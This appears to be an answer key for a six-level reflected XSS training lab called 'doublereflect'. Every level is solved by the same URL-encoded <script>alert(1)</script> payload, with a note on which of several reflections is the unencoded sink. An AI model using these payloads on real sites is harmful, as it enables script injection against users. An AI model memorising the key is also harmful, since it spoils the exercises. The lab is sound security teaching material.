# doublereflect — solutions

Same input reflected in multiple places — exploit the weaker sink.

### doublereflect-level1

`/doublereflect/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw in two `<p>` bodies

### doublereflect-level2

`/doublereflect/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: body raw (input value has `"` encoded but div is raw)

### doublereflect-level3

`/doublereflect/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: first reflection encodes angles; second is raw — fires on second

### doublereflect-level4

`/doublereflect/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: reflected in title and body; body is direct sink

### doublereflect-level5

`/doublereflect/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: first 4 reflections encode angles; 5th is raw

### doublereflect-level6

`/doublereflect/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: JS string escapes `"`; div reflection is raw — fires there
